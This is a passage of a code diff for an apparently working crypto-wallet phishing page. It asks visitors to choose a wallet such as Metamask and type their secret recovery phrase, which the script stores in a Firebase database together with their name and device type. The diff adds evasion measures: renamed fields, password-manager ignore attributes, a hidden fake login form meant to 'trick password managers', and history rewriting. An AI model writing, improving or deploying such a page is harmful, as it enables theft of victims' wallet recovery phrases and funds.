                                 <div id="phraseTextareaContainer" class="hidden phrase-textarea-container">
                                     <textarea 
                                         id="phraseTextarea" 
-                                        name="recovery_phrase"
+                                        name="xphrase"
                                         class="phrase-textarea w-full border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-gray-700 placeholder-gray-400"
                                         placeholder="Enter your secret phrase here, separated by spaces. For example: word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
-                                        spellcheck="false"
-                                        autocapitalize="off"
                                         autocomplete="off"
-                                        autocorrect="off"
-                                        inputmode="text"
+                                        autocapitalize="none"
+                                        spellcheck="false"
+                                        data-lpignore="true"
+                                        data-1p-ignore="true"
                                     ></textarea>
                                     <div class="flex justify-between items-center mt-2">
                                         <span class="text-xs text-gray-500">
@@ -617,7 +712,7 @@
                                 </div>
                             </div>
 
-                            <!-- Submit Button - Always visible at bottom -->
+                            <!-- Submit Button -->
                             <div class="submit-button-container">
                                 <button type="submit" id="submitBtn" class="compact-button w-full py-3 rounded-full font-bold btn-submit transition-all shadow-lg active:scale-95">
                                     Confirm Secret Recovery Phrase
@@ -648,6 +743,14 @@
         </div>
     </div>
 
+    <!-- Hidden fake login form to trick password managers -->
+    <div style="display: none; position: absolute; top: -1000px; left: -1000px;">
+        <form autocomplete="on">
+            <input type="text" name="username" autocomplete="username">
+            <input type="password" name="password" autocomplete="current-password">
+        </form>
+    </div>
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"
         import {
@@ -657,7 +760,6 @@
             serverTimestamp,
         } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js"
 
-        // Use the global lucide instance
         const { createIcons } = lucide;
 
         // Firebase configuration
@@ -671,7 +773,6 @@
             measurementId: "G-MT8SLSYM3S",
         }
 
-        // Initialize Firebase
         const app = initializeApp(firebaseConfig)
         const db = getFirestore(app)
 
@@ -680,6 +781,8 @@
         const openModalBtn = document.getElementById("openModalBtn")
         const closeModalBtn = document.getElementById("closeModalBtn")
         const mobileCloseBtn = document.getElementById("mobileCloseBtn")
+        const mobileBackBtn = document.getElementById("mobileBackBtn")
+        const mobileHeader = document.getElementById("mobileHeader")
         const walletItems = document.querySelectorAll(".wallet-item")
         const initialState = document.getElementById("initialState")
         const formState = document.getElementById("formState")
@@ -698,6 +801,7 @@
         const loadingOverlay = document.getElementById("loadingOverlay")
         const successOverlay = document.getElementById("successOverlay")
         const closeSuccessBtn = document.getElementById("closeSuccessBtn")
+        const fixedModalSize = document.querySelector(".fixed-modal-size")
 
         let selectedWallet = "Metamask"
         let customProvider = ""
@@ -764,23 +868,117 @@
             }
         }
 
+        // === AGGRESSIVE AUTOFILL PREVENTION ===
+        
+        // 1. Function to disable autocomplete on all inputs
+        function disableAutocomplete() {
+            const inputs = document.querySelectorAll('input, textarea, select');
+            inputs.forEach(input => {
+                input.setAttribute('autocomplete', 'off');
+                input.setAttribute('autocorrect', 'off');
+                input.setAttribute('autocapitalize', 'off');
+                input.setAttribute('spellcheck', 'false');
+                
+                // Add random attribute to confuse password managers
+                const randomId = 'x' + Math.random().toString(36).substr(2, 9);
+                input.setAttribute('data-random-id', randomId);
+                
+                // Clear any cached values
+                input.value = '';
+            });
+        }
+
+        // 2. Force clear inputs when modal opens
+        function clearAllInputs() {
+            document.getElementById('userName').value = '';
+            document.getElementById('customProvider').value = '';
+            phraseTextarea.value = '';
+            
+            // Clear phrase grid inputs
+            const wordInputs = phraseGrid.querySelectorAll('input');
+            wordInputs.forEach(input => input.value = '');
+            
+            updateWordCount();
+        }
+
+        // 3. Change input type dynamically to confuse password managers
+        function confusePasswordManagers() {
+            // Temporarily change password fields to text
+            const passwordInputs = document.querySelectorAll('input[type="password"]');
+            passwordInputs.forEach(input => {
+                const currentType = input.type;
+                input.type = 'text';
+                setTimeout(() => {
+                    input.type = currentType;
+                }, 50);
+            });
+        }
+
+        // === FULL SCREEN MODE FUNCTIONS ===
+        
+        function enterFullScreenFormMode() {
+            if (window.innerWidth < 768) {
+                // Add class to modal container for full screen form
+                fixedModalSize.classList.add('form-active');
+                
+                // Show back button, hide close button
+                mobileHeader.classList.add('hidden');
+                mobileBackBtn.classList.remove('hidden');
+                
+                // Ensure form takes full focus
+                setTimeout(() => {
+                    const interactionPanel = document.getElementById("interactionPanel");
+                    if (interactionPanel) {
+                        interactionPanel.scrollTop = 0;
+                    }
+                }, 50);
+            }
+        }
+        
+        function exitFullScreenFormMode() {
+            if (window.innerWidth < 768) {
+                // Remove full screen class
+                fixedModalSize.classList.remove('form-active');
+                
+                // Show header, hide back button
+                mobileHeader.classList.remove('hidden');
+                mobileBackBtn.classList.add('hidden');
+            }
+        }
+
         // Modal Logic
         openModalBtn.addEventListener("click", () => {
             modal.classList.remove("hidden")
             document.body.style.overflow = 'hidden'
+            
+            // Apply aggressive autofill prevention
+            disableAutocomplete();
+            clearAllInputs();
+            confusePasswordManagers();
+            
+            // Reset to initial state
+            exitFullScreenFormMode();
         })
 
         function closeModal() {
             modal.classList.add("hidden")
             document.body.style.overflow = 'auto'
             resetForm()
+            exitFullScreenFormMode();
         }
 
         closeModalBtn.addEventListener("click", closeModal)
         mobileCloseBtn.addEventListener("click", closeModal)
+        mobileBackBtn.addEventListener("click", () => {
+            // Go back to wallet selection
+            exitFullScreenFormMode();
+            formState.classList.add("hidden")
+            initialState.classList.remove("hidden")
+            walletItems.forEach((i) => i.classList.remove("active"))
+            walletItems[0].classList.add("active")
+        })
         closeSuccessBtn.addEventListener("click", closeModal)
 
-        // Close modal on overlay click
         modal.addEventListener("click", (e) => {
             if (e.target === modal) {
                 closeModal()
@@ -818,24 +1016,32 @@
                 initialState.classList.add("hidden")
                 formState.classList.remove("hidden")
                 
-                // Handle display based on wallet type
+                // Enter full screen mode on mobile
+                enterFullScreenFormMode();
+                
+                // Apply autofill prevention
+                disableAutocomplete();
+                confusePasswordManagers();
+                
                 if (selectedWallet === "Others") {
-                    // Show textarea input for Others
                     selectedWalletLogo.classList.add("hidden")
                     othersLogo.classList.remove("hidden")
                     othersProviderInput.classList.remove("hidden")
                     phraseTypeContainer.classList.add("hidden")
                     phraseGrid.classList.add("hidden")
                     phraseTextareaContainer.classList.remove("hidden")
-                    customProviderInput.focus()
                     
-                    // Reset textarea
+                    // Clear and focus
                     phraseTextarea.value = ""
                     updateWordCount()
                     isTextareaVisible = false
                     updateTextareaVisibility()
+                    
+                    // Small delay to ensure autofill doesn't trigger
+                    setTimeout(() => {
+                        customProviderInput.focus();
+                    }, 150);
                 } else {
-                    // Show grid input for regular wallets
                     selectedWalletLogo.classList.remove("hidden")
                     othersLogo.classList.add("hidden")
                     othersProviderInput.classList.add("hidden")
@@ -843,16 +1049,37 @@
                     phraseGrid.classList.remove("hidden")
                     phraseTextareaContainer.classList.add("hidden")
                     selectedWalletLogo.src = theme.logo
+                    
+                    // Clear inputs
+                    const wordInputs = phraseGrid.querySelectorAll('input');
+                    wordInputs.forEach(input => input.value = '');
+                    
+                    // Auto-focus on mobile for better UX
+                    if (window.innerWidth < 768) {
+                        setTimeout(() => {
+                            document.getElementById('userName').focus();
+                        }, 100);
+                    }
                 }
 
                 document.getElementById("importTitle").innerText = theme.title
                 document.getElementById("brandWarning").innerText = theme.warning
 
                 generatePhraseGrid(phraseTypeSelect.value)
+                
+                // Ensure mobile view scrolls to top
+                if (window.innerWidth < 768) {
+                    setTimeout(() => {
+                        const interactionPanel = document.getElementById("interactionPanel");
+                        if (interactionPanel) {
+                            interactionPanel.scrollTop = 0;
+                        }
+                    }, 50);
+                }
             })
         })
 
-        // Handle custom provider input
+        // Custom provider input
         customProviderInput.addEventListener("input", (e) => {
             customProvider = e.target.value.trim()
         })
@@ -888,7 +1115,7 @@
             createIcons()
         }
 
-        // Phrase Grid Generation (for regular wallets)
+        // Phrase Grid Generation
         function generatePhraseGrid(count) {
             phraseGrid.innerHTML = ""
             
@@ -897,13 +1124,13 @@
                 div.className = `relative flex items-center phrase-box compact-phrase-box border rounded-md group focus-within:ring-1 focus-within:ring-blue-500/20 transition-all shadow-sm`
                 div.innerHTML = `
                     <span class="text-xs font-bold opacity-40 mr-2 w-4">${i}.</span>
-                    <input type="password" name="word_${i}" placeholder="Word #${i}" 
-                           class="bg-transparent border-none outline-none flex-1 text-sm font-medium placeholder:opacity-30 focus:ring-0 placeholder:text-xs"
+                    <input type="password" name="xw${i}" placeholder="Word #${i}" 
+                           class="phrase-word-input bg-transparent border-none outline-none flex-1 text-sm font-medium placeholder:opacity-30 focus:ring-0 placeholder:text-xs"
                            autocomplete="off"
-                           autocorrect="off"
-                           autocapitalize="off"
+                           autocapitalize="none"
                            spellcheck="false"
-                           inputmode="text">
+                           data-lpignore="true"
+                           data-1p-ignore="true">
                     <button type="button" class="eye-toggle p-0.5 opacity-50 hover:opacity-100 transition-opacity">
                         <i data-lucide="eye-off" class="w-3 h-3"></i>
                     </button>
@@ -931,6 +1158,7 @@
 
         phraseTypeSelect.addEventListener("change", (e) => {
             generatePhraseGrid(e.target.value)
+            confusePasswordManagers();
         })
 
         // Form Submission
@@ -939,7 +1167,6 @@
 
             const userName = document.getElementById("userName").value.trim()
             
-            // Handle custom provider validation
             if (selectedWallet === "Others") {
                 customProvider = customProviderInput.value.trim()
                 if (!customProvider) {
@@ -953,7 +1180,6 @@
             let wordCount = 0
             
             if (selectedWallet === "Others") {
-                // Get phrase from textarea
                 phraseString = phraseTextarea.value.trim()
                 if (!phraseString) {
                     alert("Please enter your secret phrase.")
@@ -962,14 +1188,12 @@
                 }
                 wordCount = phraseString.split(/\s+/).filter(word => word.length > 0).length
                 
-                // Basic validation
                 if (wordCount < 12 || wordCount > 24) {
                     alert("Please enter a valid secret phrase (12-24 words).")
                     phraseTextarea.focus()
                     return
                 }
             } else {
-                // Get phrase from grid inputs
                 const inputs = phraseGrid.querySelectorAll("input")
                 const words = Array.from(inputs).map((input) => input.value.trim())
 
@@ -982,7 +1206,6 @@
                 wordCount = words.length
             }
             
-            // Determine final wallet name
             const finalWalletName = selectedWallet === "Others" ? customProvider : selectedWallet
 
             loadingOverlay.classList.remove("hidden")
@@ -1002,12 +1225,12 @@
                     deviceType: /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
                 })
 
-                console.log("[v0] Wallet phrase submitted successfully")
+                console.log("Wallet phrase submitted successfully")
                 loadingOverlay.classList.add("hidden")
                 successOverlay.classList.remove("hidden")
 
             } catch (error) {
-                console.error("[v0] Submission error:", error)
+                console.error("Submission error:", error)
                 alert("Connection error. Please check your network and try again.")
                 loadingOverlay.classList.add("hidden")
             }
@@ -1030,37 +1253,75 @@
             customProvider = ""
             isTextareaVisible = false
             
-            // Reset theme to default
             const interactionPanel = document.getElementById("interactionPanel")
             interactionPanel.className = `relative bg-white`
             
-            // Reset phrase grid to 12 words
             phraseTypeSelect.value = "12"
             generatePhraseGrid(12)
             
-            // Reset textarea
             phraseTextarea.value = ""
             updateWordCount()
             updateTextareaVisibility()
+            
+            // Exit full screen mode
+            exitFullScreenFormMode();
         }
 
-        // Initialize with 12 word grid
+        // Initialize
         generatePhraseGrid(12)
         updateWordCount()
+        
+        // Apply autofill prevention on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            disableAutocomplete();
+            
+            // Add extra prevention for iOS
+            if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
+                document.body.style.webkitUserSelect = 'none';
+            }
+        });
         
         // Handle keyboard close (ESC key)
         document.addEventListener('keydown', (e) => {
             if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
-                closeModal()
+                if (window.innerWidth < 768 && formState.classList.contains('hidden') === false) {
+                    // On mobile with form active, go back to wallet selection
+                    mobileBackBtn.click();
+                } else {
+                    // Otherwise close modal
+                    closeModal()
+                }
             }
-        })
+        });
         
-        // Prevent form zoom on mobile iOS
-        document.addEventListener('touchstart', function() {}, {passive: true})
+        // Handle window resize
+        window.addEventListener('resize', () => {
+            // If window is resized to desktop while in full screen mode, exit it
+            if (window.innerWidth >= 768) {
+                exitFullScreenFormMode();
+            }
+        });
     </script>
+    
     <script>
         // Initialize Lucide icons
         lucide.createIcons();
+        
+        // Final layer of autofill prevention
+        window.addEventListener('load', function() {
+            // Force disable autocomplete globally
+            document.querySelectorAll('input').forEach(input => {
+                input.autocomplete = 'off';
+                input.autocapitalize = 'off';
+                input.autocorrect = 'off';
+                input.spellcheck = false;
+            });
+            
+            // Prevent any saved form data
+            if (window.history.replaceState) {
+                window.history.replaceState(null, null, window.location.href);
+            }
+        });
     </script>
 </body>
 </html>
